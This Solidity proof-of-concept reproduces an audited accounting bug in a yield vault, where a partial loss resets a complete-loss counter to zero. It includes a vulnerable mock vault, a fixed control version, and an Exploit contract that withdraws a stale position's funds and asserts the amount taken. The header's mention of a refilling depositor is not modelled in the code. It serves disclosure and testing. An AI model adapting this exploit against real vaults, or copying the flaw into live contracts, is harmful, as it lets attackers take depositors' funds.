// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Balmy Earn — Cantina, November 2024. YieldMath.calculateAccum.
    On a partial loss the updated complete-loss counter is left at 0.
    A position that still has the pre-loss snapshot (processed events = 0,
    balance = 1000) is therefore not wiped, and withdraw pays it 1000 ether
    minus 2 wei out of the depositor who refilled the strategy. The control
    keeps the counter at 4, the snapshot is wiped, and the refill stays put.
*/

library Math {
    function mulDiv(uint256 x, uint256 y, uint256 d) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0;
            uint256 prod1;
            assembly {
                let mm := mulmod(x, y, not(0))
                prod0 := mul(x, y)
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }
            if (prod1 == 0) {
                require(d > 0);
                return prod0 / d;
            }
            require(d > prod1);
            uint256 remainder;
            assembly {
                remainder := mulmod(x, y, d)
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }
            uint256 twos = d & (~d + 1);
            assembly {
                d := div(d, twos)
                prod0 := div(prod0, twos)
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;
            uint256 inverse = (3 * d) ^ 2;
            inverse *= 2 - d * inverse;
            inverse *= 2 - d * inverse;
            inverse *= 2 - d * inverse;
            inverse *= 2 - d * inverse;
            inverse *= 2 - d * inverse;
            inverse *= 2 - d * inverse;
            result = prod0 * inverse;
        }
    }
}

contract Token {
    string public symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YieldVault {
    using Math for uint256;

    uint256 internal constant LOSS_ACCUM_INITIAL = type(uint248).max;
    uint256 internal constant MAX_COMPLETE_LOSS_EVENTS = 255;

    Token public asset;
    uint256 public lastBalance;
    uint256 public lossAccum;
    uint256 public yieldAccum;
    uint256 public completeLossEvents;
    mapping(address => uint256) public positionBalance;
    mapping(address => uint256) public positionLossAccum;
    mapping(address => uint256) public positionYieldAccum;
    mapping(address => uint256) public positionProcessed;

    constructor(Token _asset) {
        asset = _asset;
        lossAccum = LOSS_ACCUM_INITIAL;
    }

    function seedStalePosition(address user, uint256 balance, uint256 processed) external {
        positionBalance[user] = balance;
        positionLossAccum[user] = LOSS_ACCUM_INITIAL;
        positionProcessed[user] = processed;
        asset.mint(address(this), balance);
        lastBalance = balance;
        completeLossEvents = 4;
    }

    function calculateAccum(uint256 currentBalance, uint256 previousBalance, uint256 previousComplete)
        public
        view
        returns (uint256 newYield, uint256 newLoss, uint256 newEvents)
    {
        if ((currentBalance == 0 && previousBalance != 0) || previousComplete == MAX_COMPLETE_LOSS_EVENTS) {
            newYield = 0;
            newLoss = LOSS_ACCUM_INITIAL;
            newEvents = previousComplete == MAX_COMPLETE_LOSS_EVENTS ? previousComplete : previousComplete + 1;
        } else if (currentBalance < previousBalance) {
            newLoss = lossAccum.mulDiv(currentBalance, previousBalance);
            // @> VULN: partial loss never assigns newStrategyCompleteLossEvents, so the counter is stored as 0
            newYield = yieldAccum.mulDiv(newLoss, lossAccum);
        } else {
            newYield = yieldAccum;
            newLoss = lossAccum;
            newEvents = previousComplete;
        }
    }

    function notifyPartialLoss() external {
        uint256 current = asset.balanceOf(address(this));
        (uint256 newYield, uint256 newLoss, uint256 newEvents) =
            calculateAccum(current, lastBalance, completeLossEvents);
        yieldAccum = newYield;
        lossAccum = newLoss;
        completeLossEvents = newEvents;
        lastBalance = current;
    }

    function calculateBalance(address user) public view returns (uint256) {
        if (positionProcessed[user] < completeLossEvents) return 0;
        return positionBalance[user].mulDiv(lossAccum, positionLossAccum[user]);
    }

    function withdraw() external {
        uint256 amount = calculateBalance(msg.sender);
        positionBalance[msg.sender] = 0;
        require(asset.transfer(msg.sender, amount), "pay");
    }

    function burnOne() external {
        require(asset.transfer(address(0x000000000000000000000000000000000000dEaD), 1), "burn");
    }
}

contract YieldVaultFixed {
    using Math for uint256;

    uint256 internal constant LOSS_ACCUM_INITIAL = type(uint248).max;

    Token public asset;
    uint256 public lastBalance;
    uint256 public lossAccum = LOSS_ACCUM_INITIAL;
    uint256 public completeLossEvents;
    mapping(address => uint256) public positionBalance;
    mapping(address => uint256) public positionLossAccum;
    mapping(address => uint256) public positionProcessed;

    constructor(Token _asset) {
        asset = _asset;
    }

    function seedStalePosition(address user, uint256 balance) external {
        positionBalance[user] = balance;
        positionLossAccum[user] = LOSS_ACCUM_INITIAL;
        asset.mint(address(this), balance);
        lastBalance = balance;
        completeLossEvents = 4;
    }

    function burnOne() external {
        require(asset.transfer(address(0x000000000000000000000000000000000000dEaD), 1), "burn");
    }

    function notifyPartialLoss() external {
        uint256 current = asset.balanceOf(address(this));
        lossAccum = lossAccum.mulDiv(current, lastBalance);
        completeLossEvents = completeLossEvents;
        lastBalance = current;
    }

    function withdraw() external returns (uint256 amount) {
        if (positionProcessed[msg.sender] < completeLossEvents) return 0;
        amount = positionBalance[msg.sender].mulDiv(lossAccum, positionLossAccum[msg.sender]);
        positionBalance[msg.sender] = 0;
        if (amount > 0) require(asset.transfer(msg.sender, amount), "pay");
    }
}

contract Exploit {
    uint256 public constant DEPOSIT = 1000 ether;

    Token public asset;
    YieldVault public vault;
    uint256 public eventsAfter;
    uint256 public taken;

    constructor() {
        asset = new Token();
        vault = new YieldVault(asset);
        vault.seedStalePosition(address(this), DEPOSIT, 0);
    }

    function run() external {
        vault.burnOne();
        vault.notifyPartialLoss();
        eventsAfter = vault.completeLossEvents();
        uint256 beforeBal = asset.balanceOf(address(this));
        vault.withdraw();
        taken = asset.balanceOf(address(this)) - beforeBal;
        require(eventsAfter == 0, "reset");
        require(taken == 999999999999999999998, "took");
        require(asset.balanceOf(address(vault)) == 1, "left");
    }
}
